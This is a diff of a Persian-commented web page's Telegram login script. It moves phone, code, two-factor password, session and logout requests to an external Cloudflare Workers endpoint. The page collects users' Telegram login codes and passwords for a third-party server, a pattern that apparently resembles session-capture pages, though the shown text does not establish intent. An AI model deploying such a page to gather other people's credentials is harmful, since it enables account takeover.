@@ -474,6 +474,7 @@
 
   <script>
     // متغیرهای سراسری
+    const WORKER_URL = 'https://tell.a09627301.workers.dev';
     let currentPhone = '';
     let phoneCodeHash = '';
     let countdownInterval;
@@ -574,13 +575,13 @@
       updateStatus('phoneStatus', 'در حال ارسال کد تأیید...', 'loading');
       
       try {
-        const response = await fetch('/api/login', {
+        const response = await fetch(`${WORKER_URL}/api/login`, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({
-            step: 'sendCode',
+            action: 'sendCode',
             phone: phone
           })
         });
@@ -607,13 +608,13 @@
       updateStatus('codeStatus', 'در حال تأیید کد...', 'loading');
       
       try {
-        const response = await fetch('/api/login', {
+        const response = await fetch(`${WORKER_URL}/api/login`, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({
-            step: 'verifyCode',
+            action: 'verifyCode',
             phone: currentPhone,
             code: code,
             phoneCodeHash: phoneCodeHash
@@ -653,13 +654,13 @@
       updateStatus('passwordStatus', 'در حال تأیید رمز...', 'loading');
       
       try {
-        const response = await fetch('/api/login', {
+        const response = await fetch(`${WORKER_URL}/api/login`, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({
-            step: 'checkPassword',
+            action: 'checkPassword',
             phone: currentPhone,
             password: password
           })
@@ -721,7 +722,7 @@
       showScreen('userScreen');
       
       try {
-        const response = await fetch('/api/login', {
+        const response = await fetch(`${WORKER_URL}/api/check-session`, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
@@ -737,58 +738,62 @@
           updateStatus('userStatus', data.message, 'success');
           displayUserInfo(data.user);
         } else {
-          updateStatus('userStatus', 'لطفاً مجدداً وارد شوید', 'error');
+          updateStatus('userStatus', data.message, 'error');
+          localStorage.removeItem('telegram_session_id');
+          sessionId = null;
           showScreen('phoneScreen');
         }
       } catch (error) {
         console.error('Error checking session:', error);
         updateStatus('userStatus', 'خطا در بررسی وضعیت ورود. لطفاً دوباره امتحان کنید.', 'error');
+        localStorage.removeItem('telegram_session_id');
+        sessionId = null;
         showScreen('phoneScreen');
       }
     }
 
     // خروج از حساب
     async function logout() {
+      updateStatus('userStatus', 'در حال خروج...', 'loading');
+      
       try {
-        // حذ session از localStorage
-        localStorage.removeItem('telegram_session_id');
-        sessionId = null;
-        
-        // ارسال درخواست حذف session به سرور
-        await fetch('/api/login', {
+        const response = await fetch(`${WORKER_URL}/api/logout`, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({
-            action: 'logout',
             sessionId: sessionId
           })
         });
         
-        // بازگشت به صفحه اول
-        showScreen('welcomeScreen');
+        const data = await response.json();
+        
+        if (data.success) {
+          updateStatus('userStatus', data.message, 'success');
+          localStorage.removeItem('telegram_session_id');
+          sessionId = null;
+          setTimeout(() => {
+            showScreen('phoneScreen');
+          }, 1500);
+        } else {
+          updateStatus('userStatus', data.message, 'error');
+        }
       } catch (error) {
         console.error('Error logging out:', error);
-        // حتی در صورت خطا، کاربر را به صفحه اول بازگردان
-        localStorage.removeItem('telegram_session_id');
-        sessionId = null;
-        showScreen('welcomeScreen');
+        updateStatus('userStatus', 'خطا در خروج. لطفاً دوباره امتحان کنید.', 'error');
       }
     }
 
-    // نمایش صفحه مورد نظر و مخفی کردن بقیه
+    // نمایش صفحه مورد نظر
     function showScreen(screenId) {
-      const screens = ['welcomeScreen', 'phoneScreen', 'codeScreen', 'passwordScreen', 'userScreen'];
-      
-      screens.forEach(screen => {
-        const element = document.getElementById(screen);
-        if (screen === screenId) {
-          element.classList.remove('hidden');
-        } else {
-          element.classList.add('hidden');
-        }
+      // مخفی کردن تمام صفحات
+      document.querySelectorAll('.card').forEach(card => {
+        card.classList.add('hidden');
       });
+      
+      // نمایش صفحه درخواستی
+      document.getElementById(screenId).classList.remove('hidden');
     }
 
     // به‌روزرسانی وضعیت
